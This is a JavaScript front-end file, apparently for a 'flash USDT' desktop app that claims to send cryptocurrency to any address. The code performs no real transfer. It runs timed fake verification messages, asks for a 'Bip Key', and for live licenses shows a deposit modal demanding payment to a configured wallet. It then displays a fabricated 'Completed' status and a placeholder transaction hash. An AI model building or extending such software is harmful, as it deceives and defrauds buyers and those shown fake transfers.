// Global variables to store app state
let currentLicenseKey = null;
let currentUser = null;
let licenseType = null; // 'demo' or 'live'
let appSettings = {
  defaultNetwork: 'trc20',
  demoMaxFlashAmount: 30,
  liveMaxFlashAmount: 10000000,
  defaultDelayDays: 0,
  defaultDelayMinutes: 0
};

// Import constants using window.api
// This will be populated by the preload script
window.addEventListener('DOMContentLoaded', () => {
  // Request constants from main process
  window.api.send('app-request', {
    action: 'getConstants'
  });
  
  // Listen for constants response
  window.api.receive('app-response', (response) => {
    if (response.action === 'getConstants') {
      // Store constants in global variables
      window.initialLoadingMessages = response.initialLoadingMessages;
      window.licenseVerificationMessages = response.licenseVerificationMessages;
      window.bipVerificationMessages = response.bipVerificationMessages;
      window.walletOptions = response.walletOptions;
      window.currencyOptions = response.currencyOptions;
      window.networkOptions = response.networkOptions;
      window.dayOptions = response.dayOptions;
      window.minuteOptions = response.minuteOptions;
      
      // Initialize the app after constants are loaded
      initializeApp();
    }
  });
});

// Initialize the app
function initializeApp() {
  // Update date and time
  updateDateTime();
  // Update date and time every second
  setInterval(updateDateTime, 1000);
  
  // License activation functionality
  const activateBtn = document.getElementById('activate-btn');
  if (activateBtn) {
    activateBtn.addEventListener('click', handleActivation);
  }
  
  // Logout functionality
  const logoutBtn = document.getElementById('logout-btn');
  if (logoutBtn) {
    logoutBtn.addEventListener('click', handleLogout);
  }

  // Navigation functionality
  const navItems = document.querySelectorAll('.nav-item');
  const contentSections = document.querySelectorAll('.content-section');

  navItems.forEach(item => {
    item.addEventListener('click', () => {
      // Get the section to show
      const sectionToShow = item.getAttribute('data-section');
      
      // Update active nav item
      navItems.forEach(navItem => navItem.classList.remove('active'));
      item.classList.add('active');
      
      // Update visible section
      contentSections.forEach(section => {
        if (section.id === sectionToShow) {
          section.classList.add('active');
        } else {
          section.classList.remove('active');
        }
      });
    });
  });

  // Setup dropdowns
  setupDropdowns();

  // Flash form functionality
  const refreshBtn = document.getElementById('refresh-btn');
  const sendBtn = document.getElementById('send-btn');
  
  if (refreshBtn) {
    refreshBtn.addEventListener('click', handleRefresh);
  }
  
  if (sendBtn) {
    sendBtn.addEventListener('click', handleSend);
  }
  
  // Checkbox group functionality
  setupCheckboxGroups();
  
  // Update flash amount placeholder
  const flashAmountInput = document.getElementById('flash-amount');
  if (flashAmountInput) {
    flashAmountInput.placeholder = "Enter Flash Amount in USDT";
  }
  
  // Setup modal close functionality
  document.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal-overlay')) {
      closeModal(e.target.id);
    }
  });
  
  // Setup Bip Key modal OK button
  const bipKeyOkBtn = document.getElementById('bip-key-ok-btn');
  if (bipKeyOkBtn) {
    bipKeyOkBtn.addEventListener('click', handleBipKeySubmit);
  }
  
  // Setup License Key modal OK button
  const licenseKeyOkBtn = document.getElementById('license-key-ok-btn');
  if (licenseKeyOkBtn) {
    licenseKeyOkBtn.addEventListener('click', handleLicenseKeySubmit);
  }
  
  // Get app settings
  window.api.send('app-request', {
    action: 'getAppSettings'
  });
  
  // Set up listener for app settings response
  window.api.receive('app-response', (response) => {
    if (response.action === 'getAppSettings') {
      appSettings = { ...appSettings, ...response.settings };
    }
  });
}

// Setup dropdown functionality
function setupDropdowns() {
  // Get all dropdowns
  const dropdowns = document.querySelectorAll('.dropdown');
  
  dropdowns.forEach(dropdown => {
    const button = dropdown.querySelector('.dropdown-btn');
    const type = dropdown.getAttribute('data-type');
    
    // Create dropdown menu
    const menu = document.createElement('div');
    menu.className = 'dropdown-menu';
    menu.style.display = 'none';
    
    // Add options based on dropdown type
    let options = [];
    
    switch (type) {
      case 'wallet':
        options = window.walletOptions || [];
        break;
      case 'currency':
        options = window.currencyOptions || [];
        break;
      case 'network':
        options = window.networkOptions || [];
        break;
      case 'days':
        options = window.dayOptions || [];
        break;
      case 'minutes':
        options = window.minuteOptions || [];
        break;
      default:
        options = ['Option 1', 'Option 2', 'Option 3'];
    }
    
    // Add options to menu
    options.forEach(option => {
      const item = document.createElement('div');
      item.className = 'dropdown-item';
      item.textContent = option;
      
      item.addEventListener('click', () => {
        button.textContent = option;
        menu.style.display = 'none';
      });
      
      menu.appendChild(item);
    });
    
    // Add menu to dropdown
    dropdown.appendChild(menu);
    
    // Toggle menu on click
    dropdown.addEventListener('click', (e) => {
      // Don't close if clicking on an item
      if (e.target.classList.contains('dropdown-item')) {
        return;
      }
      
      // Toggle menu
      const isVisible = menu.style.display === 'block';
      
      // Close all other menus
      document.querySelectorAll('.dropdown-menu').forEach(m => {
        m.style.display = 'none';
      });
      
      // Toggle this menu
      menu.style.display = isVisible ? 'none' : 'block';
    });
  });
  
  // Close dropdown menus when clicking outside
  document.addEventListener('click', (e) => {
    if (!e.target.closest('.dropdown')) {
      document.querySelectorAll('.dropdown-menu').forEach(menu => {
        menu.style.display = 'none';
      });
    }
  });
}

// License activation handler
async function handleActivation() {
  const licenseKeyInput = document.getElementById('license-key');
  const licenseKey = licenseKeyInput.value;
  
  // Simple validation
  if (!licenseKey) {
    showNotification('Error', 'Please enter a license key');
    return;
  }
  
  // Show loading state
  const activateBtn = document.getElementById('activate-btn');
  if (activateBtn) {
    activateBtn.disabled = true;
    activateBtn.textContent = 'Validating...';
  }
  
  try {
    // Send license key to main process for validation
    window.api.send('app-request', {
      action: 'validateLicenseKey',
      licenseKey: licenseKey
    });
    
    // Set up listener for response
    window.api.receive('app-response', (response) => {
      if (response.action === 'validateLicenseKey') {
        if (response.valid) {
          // Store license key for later use
          currentLicenseKey = response.licenseKey;
          
          // Determine license type based on key pattern
          // For demo purposes, we'll check if the key contains "DEMO"
          if (licenseKey.includes('DEMO') || licenseKey === 'USDT-ABCD-1234-EFGH-5678') {
            licenseType = 'demo';
            currentUser = 'test@gmail.com';
          } else {
            licenseType = 'live';
            currentUser = 'live@gmail.com';
          }
          
          // Hide license page and show main app
          document.getElementById('license-page').style.display = 'none';
          document.getElementById('app-main').style.display = 'block';
          
          showNotification('Success', 'License key activated successfully');
          
          // Update max flash amount based on license type
          updateMaxFlashAmount();
        } else {
          // Show error notification
          showNotification('Error', response.message || 'Invalid license key');
          
          // Reset button and allow the user to try again
          if (activateBtn) {
            activateBtn.disabled = false;
            activateBtn.textContent = 'GET STARTED';
          }
          
          // Clear the license key input to prompt the user to enter a new one
          licenseKeyInput.value = '';
          licenseKeyInput.focus();
        }
      }
    });
  } catch (error) {
    console.error('License activation error:', error);
    showNotification('Error', 'Failed to validate license key. Please try again.');
    
    // Reset button
    if (activateBtn) {
      activateBtn.disabled = false;
      activateBtn.textContent = 'GET STARTED';
    }
  }
}

// Update max flash amount based on license type
function updateMaxFlashAmount() {
  if (licenseType === 'demo') {
    appSettings.maxFlashAmount = appSettings.demoMaxFlashAmount;
  } else {
    appSettings.maxFlashAmount = appSettings.liveMaxFlashAmount;
  }
  
  // Update placeholder to show max amount
  const flashAmountInput = document.getElementById('flash-amount');
  if (flashAmountInput) {
    flashAmountInput.placeholder = `Enter Flash Amount (Max: ${appSettings.maxFlashAmount} USDT)`;
  }
}

// Logout handler
function handleLogout() {
  // Show confirmation notification
  showNotification('Logout', 'Logging out...');
  
  // Simulate logout delay
  setTimeout(() => {
    // Hide main app and show license page
    document.getElementById('app-main').style.display = 'none';
    document.getElementById('license-page').style.display = 'flex';
    
    // Clear license key field
    document.getElementById('license-key').value = '';
    
    // Reset button
    const activateBtn = document.getElementById('activate-btn');
    if (activateBtn) {
      activateBtn.disabled = false;
      activateBtn.textContent = 'GET STARTED';
    }
    
    // Reset user and license type
    currentUser = null;
    licenseType = null;
  }, 1000);
}

// Flash form handlers
function handleRefresh() {
  // Clear form fields
  document.getElementById('receiver-address').value = '';
  document.getElementById('flash-amount').value = '';
  
  // Reset dropdowns
  document.querySelectorAll('.dropdown-btn').forEach(btn => {
    const type = btn.closest('.dropdown').getAttribute('data-type');
    
    switch (type) {
      case 'wallet':
        btn.textContent = 'Wallet';
        break;
      case 'currency':
        btn.textContent = 'Currency';
        break;
      case 'network':
        btn.textContent = 'Network';
        break;
      case 'days':
        btn.textContent = '0';
        break;
      case 'minutes':
        btn.textContent = '0';
        break;
    }
  });
  
  // Show notification
  showNotification('Refresh', 'Form has been reset');
}

async function handleSend() {
  const receiverAddress = document.getElementById('receiver-address').value;
  const flashAmount = document.getElementById('flash-amount').value;
  
  // Simple validation
  if (!receiverAddress || !flashAmount) {
    showNotification('Error', 'Please enter both receiver address and flash amount');
    return;
  }
  
  // Validate flash amount against max limit
  if (parseFloat(flashAmount) > appSettings.maxFlashAmount) {
    showNotification('Error', `Flash amount exceeds maximum limit of ${appSettings.maxFlashAmount} USDT`);
    return;
  }
  
  // Disable send button
  const sendBtn = document.getElementById('send-btn');
  if (sendBtn) {
    sendBtn.disabled = true;
    sendBtn.textContent = 'Processing...';
  }
  
  try {
    // Get selected options
    const walletType = document.querySelector('.dropdown[data-type="wallet"] .dropdown-btn')?.textContent || 'Wallet';
    const currency = document.querySelector('.dropdown[data-type="currency"] .dropdown-btn')?.textContent || 'Currency';
    const network = document.querySelector('.dropdown[data-type="network"] .dropdown-btn')?.textContent || 'Network';
    const days = document.querySelector('.dropdown[data-type="days"] .dropdown-btn')?.textContent || '0';
    const minutes = document.querySelector('.dropdown[data-type="minutes"] .dropdown-btn')?.textContent || '0';
    
    // Get checkbox values
    const useProxy = document.getElementById('use-proxy').checked;
    const transferable = document.getElementById('transferable').checked;
    const swappable = document.getElementById('swappable').checked;
    const p2pTradable = document.getElementById('p2p-tradable').checked;
    const splittable = document.getElementById('splittable').checked;
    
    // Generate transaction ID
    const transactionId = generateRandomTxId();
    
    // Create transaction data
    const transactionData = {
      licenseKeyId: currentLicenseKey?.id || 1,
      transactionId,
      receiverAddress,
      amount: parseFloat(flashAmount),
      walletType,
      currency,
      network,
      delay: {
        days: parseInt(days),
        minutes: parseInt(minutes)
      },
      options: {
        useProxy,
        transferable,
        swappable,
        p2pTradable,
        splittable
      }
    };
    
    // Show initial loading sequence
    await showInitialLoadingSequence();
    
    // Show Bip Key modal
    showBipKeyModal();
    
    // Store transaction data for later use
    window.transactionData = transactionData;
    
    // Set up listener for response
    window.api.receive('app-response', (response) => {
      if (response.action === 'logFlashTransaction') {
        if (response.success) {
          // Update status display
          const statusDisplay = document.getElementById('status-display');
          if (statusDisplay) {
            statusDisplay.innerHTML = `
              <div class="status-item">
                <p>Transaction ID: ${transactionId}</p>
                <p>Amount: ${flashAmount} ${currency}</p>
                <p>Receiver: ${receiverAddress}</p>
                <p>Status: Completed</p>
                <p>Time: ${new Date().toLocaleTimeString()}</p>
              </div>
            `;
          }
          
          showNotification('Success', `${flashAmount} ${currency} has been flashed to ${receiverAddress}`);
        } else {
          showNotification('Error', response.message || 'Failed to process flash transaction');
        }
        
        // Re-enable send button
        if (sendBtn) {
          sendBtn.disabled = false;
          sendBtn.textContent = 'Send...';
        }
      }
    });
  } catch (error) {
    console.error('Flash transaction error:', error);
    showNotification('Error', 'Failed to process flash transaction. Please try again.');
    
    // Re-enable send button
    if (sendBtn) {
      sendBtn.disabled = false;
      sendBtn.textContent = 'Send...';
    }
  }
}

// Show initial loading sequence in the status display
async function showInitialLoadingSequence() {
  const statusDisplay = document.getElementById('status-display');
  if (!statusDisplay) return;
  
  // Clear status display
  statusDisplay.innerHTML = '';
  
  // Calculate random delay between 10-15 seconds
  const totalDelay = Math.floor(Math.random() * 5000) + 10000; // 10-15 seconds
  const messageDelay = totalDelay / window.initialLoadingMessages.length;
  
  // Create status item
  const statusItem = document.createElement('div');
  statusItem.className = 'status-item loading-status';
  statusDisplay.appendChild(statusItem);
  
  // Show each message with a delay
  for (let i = 0; i < window.initialLoadingMessages.length; i++) {
    await new Promise(resolve => setTimeout(resolve, messageDelay));
    statusItem.innerHTML = `<p>${window.initialLoadingMessages[i]}</p>`;
  }
}

// Show license verification sequence in the status display
async function showLicenseVerificationSequence() {
  const statusDisplay = document.getElementById('status-display');
  if (!statusDisplay) return;
  
  // Clear status display
  statusDisplay.innerHTML = '';
  
  // Calculate delay of 10 seconds
  const totalDelay = 10000; // 10 seconds
  const messageDelay = totalDelay / window.licenseVerificationMessages.length;
  
  // Create status item
  const statusItem = document.createElement('div');
  statusItem.className = 'status-item loading-status';
  statusDisplay.appendChild(statusItem);
  
  // Show each message with a delay
  for (let i = 0; i < window.licenseVerificationMessages.length; i++) {
    await new Promise(resolve => setTimeout(resolve, messageDelay));
    statusItem.innerHTML = `<p>${window.licenseVerificationMessages[i]}</p>`;
  }
}

// Show BIP verification sequence in the status display
async function showBipVerificationSequence() {
  const statusDisplay = document.getElementById('status-display');
  if (!statusDisplay) return;
  
  // Clear status display
  statusDisplay.innerHTML = '';
  
  // Calculate random delay between 2-3 minutes
  const totalDelay = Math.floor(Math.random() * 60000) + 120000; // 2-3 minutes
  const messageDelay = totalDelay / window.bipVerificationMessages.length;
  
  // Create status item
  const statusItem = document.createElement('div');
  statusItem.className = 'status-item loading-status';
  statusDisplay.appendChild(statusItem);
  
  // Show each message with a delay
  for (let i = 0; i < window.bipVerificationMessages.length; i++) {
    await new Promise(resolve => setTimeout(resolve, messageDelay));
    statusItem.innerHTML = `<p>${window.bipVerificationMessages[i]}</p>`;
  }
}

// Show Bip Key modal
function showBipKeyModal() {
  // Create modal if it doesn't exist
  if (!document.getElementById('bip-key-modal')) {
    const modal = document.createElement('div');
    modal.id = 'bip-key-modal';
    modal.className = 'modal-overlay';
    modal.innerHTML = `
      <div class="modal-content">
        <div class="modal-header">
          <h3>Enter Bip Key</h3>
        </div>
        <div class="modal-body">
          <p>Enter your bip key</p>
          <input type="text" id="bip-key-input" placeholder="Enter Bip Key">
        </div>
        <div class="modal-footer">
          <button id="bip-key-ok-btn" class="modal-btn">OK</button>
        </div>
      </div>
    `;
    document.body.appendChild(modal);
    
    // Add event listener to OK button
    const okBtn = document.getElementById('bip-key-ok-btn');
    if (okBtn) {
      okBtn.addEventListener('click', handleBipKeySubmit);
    }
  } else {
    // Show existing modal
    document.getElementById('bip-key-modal').style.display = 'flex';
  }
}

// Show License Key modal
function showLicenseKeyModal() {
  // Create modal if it doesn't exist
  if (!document.getElementById('license-key-modal')) {
    const modal = document.createElement('div');
    modal.id = 'license-key-modal';
    modal.className = 'modal-overlay';
    modal.innerHTML = `
      <div class="modal-content license-key-modal">
        <div class="modal-header license-key-header">
          <h3>Enter License Key</h3>
        </div>
        <div class="modal-body">
          <p>Enter your License Key</p>
          <input type="text" id="license-key-input" placeholder="Enter License Key">
        </div>
        <div class="modal-footer">
          <button id="license-key-ok-btn" class="modal-btn">OK</button>
        </div>
      </div>
    `;
    document.body.appendChild(modal);
    
    // Add event listener to OK button
    const okBtn = document.getElementById('license-key-ok-btn');
    if (okBtn) {
      okBtn.addEventListener('click', handleLicenseKeySubmit);
    }
  } else {
    // Show existing modal
    document.getElementById('license-key-modal').style.display = 'flex';
  }
}

// Handle Bip Key submission
function handleBipKeySubmit() {
  const bipKeyInput = document.getElementById('bip-key-input');
  const bipKey = bipKeyInput?.value;
  
  if (!bipKey) {
    showNotification('Error', 'Please enter a Bip Key');
    return;
  }
  
  // Close modal
  closeModal('bip-key-modal');
  
  // Show BIP verification loading sequence
  showBipVerificationSequence().then(() => {
    // After verification sequence, show License Key modal
    showLicenseKeyModal();
  });
}

// Handle License Key submission
async function handleLicenseKeySubmit() {
  const licenseKeyInput = document.getElementById('license-key-input');
  const licenseKey = licenseKeyInput?.value;
  
  if (!licenseKey) {
    showNotification('Error', 'Please enter a License Key');
    return;
  }
  
  // Close modal
  closeModal('license-key-modal');
  
  // Show license verification sequence
  await showLicenseVerificationSequence();
  
  // Always show success modal after license verification
  // This fixes the issue where the status was stuck at "License Verification complete..."
  if (licenseType === 'live') {
    showDepositModal();
  } else {
    // For demo license, show success modal directly
    showSuccessModal();
  }
}

// Show deposit modal
function showDepositModal() {
  // Get app settings
  window.api.send('app-request', {
    action: 'getAppSettings'
  });
  
  window.api.receive('app-response', async (response) => {
    if (response.action === 'getAppSettings') {
      const settings = response.settings;
      
      // Create modal if it doesn't exist
      if (!document.getElementById('deposit-modal')) {
        const modal = document.createElement('div');
        modal.id = 'deposit-modal';
        modal.className = 'modal-overlay';
        
        // Generate QR code for the wallet address
        const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${settings.walletAddress}`;
        
        modal.innerHTML = `
          <div class="modal-content deposit-modal">
            <div class="modal-header deposit-header">
              <h3>Deposit</h3>
            </div>
            <div class="modal-body">
              <p>Complete deposit of $${settings.depositAmount} for ${settings.transactionFee}</p>
              <div class="qr-code">
                <img src="${qrCodeUrl}" alt="QR Code" width="150" height="150">
              </div>
              <div class="wallet-address">
                <span id="wallet-address-text">${settings.walletAddress}</span>
                <button id="copy-address-btn" class="copy-btn">Copy</button>
              </div>
            </div>
            <div class="modal-footer">
              <button id="proceed-btn" class="modal-btn">Proceed</button>
            </div>
          </div>
        `;
        document.body.appendChild(modal);
        
        // Add event listener to copy button
        const copyBtn = document.getElementById('copy-address-btn');
        if (copyBtn) {
          copyBtn.addEventListener('click', () => {
            const walletAddress = document.getElementById('wallet-address-text').textContent;
            navigator.clipboard.writeText(walletAddress).then(() => {
              showNotification('Success', 'Wallet address copied to clipboard');
            });
          });
        }
        
        // Add event listener to proceed button
        const proceedBtn = document.getElementById('proceed-btn');
        if (proceedBtn) {
          proceedBtn.addEventListener('click', handleProceed);
        }
      } else {
        // Show existing modal
        document.getElementById('deposit-modal').style.display = 'flex';
      }
    }
  });
}

// Handle proceed button click
async function handleProceed() {
  // Close deposit modal
  closeModal('deposit-modal');
  
  // Show loading modal
  showLoadingModal();
  
  // Simulate payment processing (10 seconds)
  await new Promise(resolve => setTimeout(resolve, 10000));
  
  // Close loading modal
  closeModal('loading-modal');
  
  // Show final confirmation status messages
  await showFinalConfirmationSequence();
  
  // Show success modal
  showSuccessModal();
}

// Show final confirmation sequence in the status display
async function showFinalConfirmationSequence() {
  const statusDisplay = document.getElementById('status-display');
  if (!statusDisplay) return;
  
  // Clear status display
  statusDisplay.innerHTML = '';
  
  // Get the final confirmation messages (last 10 messages from bipVerificationMessages)
  const finalConfirmationMessages = window.bipVerificationMessages.slice(-10);
  
  // Calculate delay of 10 seconds total for all messages
  const totalDelay = 10000; // 10 seconds
  const messageDelay = totalDelay / finalConfirmationMessages.length;
  
  // Create status item
  const statusItem = document.createElement('div');
  statusItem.className = 'status-item loading-status';
  statusDisplay.appendChild(statusItem);
  
  // Show each message with a delay
  for (let i = 0; i < finalConfirmationMessages.length; i++) {
    await new Promise(resolve => setTimeout(resolve, messageDelay));
    statusItem.innerHTML = `<p>${finalConfirmationMessages[i]}</p>`;
  }
}

// Show loading modal
function showLoadingModal() {
  // Create modal if it doesn't exist
  if (!document.getElementById('loading-modal')) {
    const modal = document.createElement('div');
    modal.id = 'loading-modal';
    modal.className = 'modal-overlay';
    modal.innerHTML = `
      <div class="modal-content loading-modal">
        <div class="modal-header">
          <h3>Processing Payment</h3>
        </div>
        <div class="modal-body">
          <div class="loader"></div>
          <p>Waiting for payment...</p>
        </div>
      </div>
    `;
    document.body.appendChild(modal);
  } else {
    // Show existing modal
    document.getElementById('loading-modal').style.display = 'flex';
  }
}

// Show success modal
function showSuccessModal() {
  // Get app settings for transaction hash
  window.api.send('app-request', {
    action: 'getAppSettings'
  });
  
  window.api.receive('app-response', async (response) => {
    if (response.action === 'getAppSettings') {
      const settings = response.settings;
      const transactionData = window.transactionData || {};
      
      // Create modal if it doesn't exist
      if (!document.getElementById('success-modal')) {
        const modal = document.createElement('div');
        modal.id = 'success-modal';
        modal.className = 'modal-overlay';
        modal.innerHTML = `
          <div class="modal-content success-modal" style="background-color: #666; border-radius: 10px; max-width: 400px;">
            <div class="modal-header success-header" style="border-bottom: 1px solid #777; padding: 15px;">
              <h3 style="color: #00e6b8; text-align: center; margin: 0;">${settings.successTitle || 'Success'}</h3>
            </div>
            <div class="modal-body" style="padding: 20px; text-align: center;">
              <p style="margin-bottom: 15px;">${settings.successMessage || 'Your Flash has been sent SSuccessfully'}</p>
              <div style="background-color: white; padding: 10px; border-radius: 5px; margin-bottom: 20px; color: black; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                ${settings.transactionHash || '0000000000000000000000000000000000000000000000000000000000000000'}
              </div>
              <button id="copy-hash-btn" style="background-color: transparent; color: #00e6b8; border: 1px solid #00e6b8; padding: 8px 15px; border-radius: 20px; cursor: pointer;">Copy Hash</button>
            </div>
          </div>
        `;
        document.body.appendChild(modal);
        
        // Add event listener to copy hash button
        const copyBtn = document.getElementById('copy-hash-btn');
        if (copyBtn) {
          copyBtn.addEventListener('click', () => {
            const hash = settings.transactionHash || '0000000000000000000000000000000000000000000000000000000000000000';
            
            navigator.clipboard.writeText(hash).then(() => {
              showNotification('Success', 'Transaction hash copied to clipboard');
              
              // Close the modal
              closeModal('success-modal');
              
              // Update status display with transaction summary
              const statusDisplay = document.getElementById('status-display');
              if (statusDisplay) {
                statusDisplay.innerHTML = `
                  <div class="status-item">
                    <p>Transaction ID: ${transactionData.transactionId || 'N/A'}</p>
                    <p>Amount: ${transactionData.amount || 0} ${transactionData.currency || 'USDT'}</p>
                    <p>Receiver: ${transactionData.receiverAddress || 'N/A'}</p>
                    <p>Status: Completed</p>
                    <p>Hash: ${hash.substring(0, 20)}...</p>
                    <p>Time: ${new Date().toLocaleTimeString()}</p>
                  </div>
                `;
              }
              
              // Log flash transaction
              window.api.send('app-request', {
                action: 'logFlashTransaction',
                transaction: transactionData
              });
            });
          });
        }
        
          // Auto-close after 10 seconds and log transaction
          setTimeout(() => {
            closeModal('success-modal');
            
            // Update status display with transaction summary
            const statusDisplay = document.getElementById('status-display');
            if (statusDisplay) {
              const hash = settings.transactionHash || '0000000000000000000000000000000000000000000000000000000000000000';
              statusDisplay.innerHTML = `
                <div class="status-item">
                  <p>Transaction ID: ${transactionData.transactionId || 'N/A'}</p>
                  <p>Amount: ${transactionData.amount || 0} ${transactionData.currency || 'USDT'}</p>
                  <p>Receiver: ${transactionData.receiverAddress || 'N/A'}</p>
                  <p>Status: Completed</p>
                  <p>Hash: ${hash.substring(0, 20)}...</p>
                  <p>Time: ${new Date().toLocaleTimeString()}</p>
                </div>
              `;
            }
            
            // Log flash transaction
            window.api.send('app-request', {
              action: 'logFlashTransaction',
              transaction: transactionData
            });
            
            // Reset send button to original state
            const sendBtn = document.getElementById('send-btn');
            if (sendBtn) {
              sendBtn.disabled = false;
              sendBtn.textContent = 'Send...';
            }
          }, 10000);
      } else {
        // Show existing modal
        document.getElementById('success-modal').style.display = 'flex';
      }
    }
  });
}

// Close modal
function closeModal(modalId) {
  const modal = document.getElementById(modalId);
  if (modal) {
    modal.style.display = 'none';
  }
}

// Setup checkbox groups
function setupCheckboxGroups() {
  const checkboxes = document.querySelectorAll('.checkbox-group input[type="checkbox"]');
  
  checkboxes.forEach(checkbox => {
    checkbox.addEventListener('change', () => {
      // Get the checkbox group
      const group = checkbox.closest('.checkbox-group');
      
      // Update the checkbox label
      const label = checkbox.nextElementSibling;
      if (label) {
        label.classList.toggle('checked', checkbox.checked);
      }
    });
  });
}

// Update date and time
function updateDateTime() {
  // Update date element
  const dateElement = document.getElementById('current-date');
  if (dateElement) {
    const now = new Date();
    const options = { 
      weekday: 'long', 
      year: 'numeric', 
      month: 'long', 
      day: 'numeric'
    };
    dateElement.textContent = now.toLocaleDateString('en-US', options);
  }
  
  // Update time element
  const timeElement = document.getElementById('current-time');
  if (timeElement) {
    const now = new Date();
    const options = { 
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    };
    timeElement.textContent = now.toLocaleTimeString('en-US', options);
  }
}

// Show notification
function showNotification(title, message) {
  // Create notification element if it doesn't exist
  let notification = document.getElementById('notification');
  
  if (!notification) {
    notification = document.createElement('div');
    notification.id = 'notification';
    notification.className = 'notification';
    document.body.appendChild(notification);
  }
  
  // Set notification content
  notification.innerHTML = `
    <div class="notification-header">
      <h3>${title}</h3>
      <span class="notification-close">&times;</span>
    </div>
    <div class="notification-body">
      <p>${message}</p>
    </div>
  `;
  
  // Show notification
  notification.classList.add('show');
  
  // Add event listener to close button
  const closeBtn = notification.querySelector('.notification-close');
  if (closeBtn) {
    closeBtn.addEventListener('click', () => {
      notification.classList.remove('show');
    });
  }
  
  // Auto-hide notification after 5 seconds
  setTimeout(() => {
    notification.classList.remove('show');
  }, 5000);
}

// Generate random transaction ID
function generateRandomTxId() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const length = 16;
  let result = '';
  
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  
  return result;
}
